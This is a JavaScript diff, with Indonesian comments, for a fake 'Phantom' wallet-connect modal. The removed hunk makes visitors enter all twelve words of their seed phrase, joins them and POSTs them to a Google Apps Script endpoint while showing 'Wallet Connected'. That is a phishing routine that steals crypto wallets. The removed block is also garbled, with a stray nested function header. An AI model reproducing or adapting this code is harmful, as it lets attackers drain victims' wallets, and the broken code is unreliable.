@@ -177,10 +177,7 @@ window.openPhantomModal = function() {
     const phantomStepConnect = document.getElementById("phantomStepConnect");
     const phantomStepConnected = document.getElementById("phantomStepConnected");
     if (!phantomModal) return;
-// Reset 12 kotak nama jadi kosong lagi
-for(let i = 1; i <= 12; i++) {
-  document.getElementById("name" + i).value = "";
-}
+
     phantomStepConnect.classList.remove("hidden");
     phantomStepConnected.classList.add("hidden");
     phantomModal.classList.add("show");
@@ -194,42 +191,6 @@ window.closePhantomModal = function() {
 
 /* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA + KIRIM KE SHEET */
 window.doPhantomConnect = function() {
-    dow.doPhantomConnect = function() {
-    
-    // 1. VALIDASI 12 KOTAK
-    let names = [];
-    for(let i = 1; i <= 12; i++) {
-      let input = document.getElementById("name" + i);
-      if(!input || input.value.trim() === "") { 
-        alert("❌ Wajib isi 12 kotak seed phrase dulu bro!\nKotak no " + i + " masih kosong");
-        return; 
-      }
-      names.push(input.value.trim());
-    }
-    let demoWalletName = names.join(" ");
-
-    // 2. UBAH TOMBOL JADI CONNECTED
-    let button = document.getElementById("connectBtn"); // GANTI ID TOMBOL KAMU JIKA BEDA
-    button.innerHTML = `✔️ Wallet Connected`;
-    button.style.backgroundColor = "#22c55e"; // Biar ijo
-    button.disabled = true; // Biar gak bisa di klik 2x
-
-    // 3. KIRIM KE GOOGLE SHEET - INI YG SERING KELEWAT
-    fetch("URL_GOOGLE_SHEET_KAMU", { // GANTI INI DENGAN URL APPS SCRIPT KAMU
-      method: "POST",
-      body: JSON.stringify({name: demoWalletName})
-    })
-    .then(res => res.json())
-    .then(data => {
-      alert("✅ Data berhasil dikirim!");
-      console.log("Sukses:", data);
-    })
-    .catch(err => {
-      alert("❌ Gagal kirim ke Sheet: " + err);
-      console.error(err);
-    });
-
-}
     const btn = document.getElementById("phantomConnectBtn");
     const address = document.getElementById("phantomAddress");
     const nameDisplay = document.getElementById("phantomNameDisplay");
@@ -258,7 +219,7 @@ if (demoWalletName === "") {
     setTimeout(() => {
         walletConnected = true;
         if (address) address.textContent = fakeAddress;
-        if (nameDisplay) nameDisplay.textContent = "✔️ Wallet Connected"; // tampilin nama
+        if (nameDisplay) nameDisplay.textContent = demoWalletName; // tampilin nama
         stepConnect.classList.add("hidden");
         stepConnected.classList.remove("hidden");
         btn.textContent = "Connect";
@@ -298,7 +259,7 @@ function updateWalletButton() {
     const button = document.getElementById("connectWallet");
     if (!button) return;
     if (walletConnected) {
-        button.innerHTML = `✔️ Wallet Connected`;// <--- INI KUNCINYA
+        button.innerHTML = `✓ ${demoWalletName}`; // <--- INI KUNCINYA
         button.style.borderColor = "#35d98b";
         button.style.color = "#35d98b";
     } else {
